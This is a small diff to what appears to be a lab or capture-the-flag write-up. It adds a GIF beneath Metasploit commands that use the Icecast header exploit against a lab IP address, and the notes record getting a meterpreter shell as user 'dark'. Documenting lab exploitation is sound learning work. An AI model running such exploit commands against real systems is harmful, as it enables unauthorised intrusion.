@@ -22,6 +22,7 @@ use exploit/windows/http/icecast_header
 set RHOSTS 10.10.194.155
 exploit
 ```
+![meterpreter](https://media.giphy.com/media/XqXDNFZREKMBq/giphy.gif)
 - We got a `meterpreter` shell
 - We are user:`dark`
 
